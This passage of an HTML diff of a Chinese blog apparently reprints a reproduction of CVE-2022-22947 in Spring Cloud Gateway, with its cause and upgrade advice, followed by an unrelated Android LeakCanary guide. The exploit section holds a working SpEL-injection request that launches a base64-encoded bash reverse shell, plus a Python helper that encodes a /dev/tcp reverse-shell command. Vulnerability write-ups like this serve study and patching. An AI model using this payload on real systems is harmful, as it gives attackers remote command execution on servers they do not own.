</span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/5.png" alt="image"><br>删除后用记得也用refresh</p>
-</blockquote>
-<h2><span id="反弹shell">反弹shell</span></h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>333</span><br><span class="line"></span><br><span class="line"><span class="language-livescript">&#123;</span></span><br><span class="line"><span class="language-livescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-livescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-livescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-livescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-livescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-livescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="string">\&quot;bash</span> -c &#123;echo,反弹shellbase64&#125;</span>|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;).getInputStream()))&#125;&quot;</span></span></span><br><span class="line"><span class="language-livescript">    &#125;</span></span><br><span class="line"><span class="language-livescript">  &#125;],</span></span><br><span class="line"><span class="language-livescript">  <span class="string">&quot;uri&quot;</span>: <span class="string">&quot;http://example.com&quot;</span></span></span><br><span class="line"><span class="language-livescript">&#125;</span></span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>删去new String[]初始化，直接将base64的反弹shell命令放入填入<br>生成base64那个站点崩了，可以自己写个python</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base64_str = <span class="built_in">input</span>(<span class="string">&quot;请输入反弹shell命令,如：bash -i  &gt;&amp;  /dev/tcp/11.11.11.11/2334 0&gt;&amp;1\n&quot;</span>)</span><br><span class="line">res = base64.b64encode(base64_str.encode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bash -c &#123;echo,&quot;</span>+res.decode()+<span class="string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<h2><span id="漏洞原理">漏洞原理</span></h2><blockquote>
-<p>SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行<br>如果想要深入学习SpEL表达式可以参考<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">Mi1k7ea师傅的文章</a></p>
-</blockquote>
-<blockquote>
-<p>首先定位到漏洞的修复版本对比<br><code>https://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e</code><br><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/6.png" alt="image"><br>可以看到删除了默认的StandardEvaluationContext，改用自定义的GatewayEvaluationContext来对表达式进行SpEL进行处理</p>
-<p>默认的StandardEvaluationContext里getValue方法</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue)</span> &#123;</span><br><span class="line">	Object value;</span><br><span class="line">	<span class="type">String</span> <span class="variable">rawValue</span> <span class="operator">=</span> entryValue;</span><br><span class="line">	<span class="keyword">if</span> (rawValue != <span class="literal">null</span>) &#123;</span><br><span class="line">		rawValue = rawValue.trim();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (rawValue != <span class="literal">null</span> &amp;&amp; rawValue.startsWith(<span class="string">&quot;#&#123;&quot;</span>) &amp;&amp; entryValue.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">		<span class="comment">// assume it&#x27;s spel</span></span><br><span class="line">		<span class="type">StandardEvaluationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StandardEvaluationContext</span>();</span><br><span class="line">		context.setBeanResolver(<span class="keyword">new</span> <span class="title class_">BeanFactoryResolver</span>(beanFactory));</span><br><span class="line">		<span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(entryValue, <span class="keyword">new</span> <span class="title class_">TemplateParserContext</span>());</span><br><span class="line">		value = expression.getValue(context);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		value = entryValue;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>可以控制 getValue 方法调用,那么就能调用任何有效的表达式达到注入效果</p>
-</blockquote>
-<h2><span id="修复建议">修复建议</span></h2><blockquote>
-<p>3.1.x用户应升级到3.1.1+<br>3.0.x用户应升级到3.0.7+<br>如果不需要Actuator端点，可以通过management.endpoint.gateway.enable：false配置将其禁用<br>如果需要Actuator端点，则应使用Spring Security对其进行保护</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/25/Android-Leaks/">
-                android使用Leaks检测内存泄漏
-            </a>
-        </h2>
-    
-    <time>
-        Oct 25, 2023
-    </time>
-    <section class="content">
-        <h1><span id="android使用leaks检测内存泄漏">android使用Leaks检测内存泄漏</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/fancy_xty/article/details/51595313">浅浅清风</a> 并作补充</p>
-</blockquote>
-<h2><span id="leaks-内存泄漏检测工具使用">Leaks 内存泄漏检测工具使用</span></h2><blockquote>
-<p>网址:<a target="_blank" rel="noopener" href="https://github.com/square/leakcanary">https://github.com/square/leakcanary</a><br>在你的module中添加依赖</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debugCompile <span class="string">&#x27;com.squareup.leakcanary:leakcanary-android:1.4-beta2&#x27;</span></span><br><span class="line">releaseCompile <span class="string">&#x27;com.squareup.leakcanary:leakcanary-android-no-op:1.4-beta2&#x27;</span></span><br><span class="line">testCompile <span class="string">&#x27;com.squareup.leakcanary:leakcanary-android-no-op:1.4-beta2&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>在Application中添加: <code>LeakCanary.install(this);</code></p>
-</blockquote>
-<blockquote>
-<p>并且确保你的app处于调试模式，如下图:</p>
-<p><img src="/2023/10/25/Android-Leaks/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>当切换到release版本的时候,leakcanary-debug不会被打包.所以切换到release之后不用对leakcanary做注释或者删除等操作.<br>现在就可以开始使用了,重新编译你的工程,运行在模拟器或真机上.<br>在各个页面中测试,如果存在内存泄漏的情况,leaks会弹出通知提醒你查看.<br>在leaks中会有详细的泄漏说明，如产生内存泄漏的大小，产生内存泄漏的页面和相关的信息。</p>
-<p><img src="/2023/10/25/Android-Leaks/2.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>内存泄漏详情：</p>
-<p><img src="/2023/10/25/Android-Leaks/3.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>最后有一些关于内存泄漏的建议:<br>为了避免上下文相关的内存泄漏,记住以下几点:<br>不要长期引用context-activity(引用一个活动应该有相同的生命周期活动本身)<br>使用getApplicationContext而不是context或activity试试<br>避免非静态内部类的一个活动如果你不控制自己的生命周期,使用静态内部类,让一个弱引用来传递,并且记住,垃圾收集器对于内存泄漏并不保险。</p>
-</blockquote>
-<blockquote>
-<p>下面说几个作者遇到的内存泄漏的情况以及解决方案:<br>使用百度地图LocationClient.在Activity被销毁时调用</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mLocClient != <span class="literal">null</span>)&#123;</span><br><span class="line">            mLocClient.unRegisterLocationListener(myListener);</span><br><span class="line">            mLocClient.stop();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>使用友盟分享登录时, 传递getApplicationContext<br>第三方库如果需要传入Activity的时候，传递一个弱引用进去， 可以避免内存泄漏,如下：</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Reference&lt;HomeActivity&gt; reference = <span class="keyword">new</span> <span class="title class_">WeakReference</span>(getActivity());</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ShareAction</span>(reference.get()).setDisplayList(displaylist);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>在Handler中容易造成内存泄漏，最好使用弱引用方式，要么，在Activity销毁的时候清空所有的handler栈。</p>
-<p>在使用WebView的时候也可能出现内存泄漏，解决办法，我的<a target="_blank" rel="noopener" href="http://blog.csdn.net/fancy_xty/article/details/51595697">另一篇博客</a>里有详细讲解。</p>
-<p>在使用RxJava的时候也可能会出现内存泄漏，可以使用RxLifecycler来解决。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Leaks/" rel="tag">Leaks</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
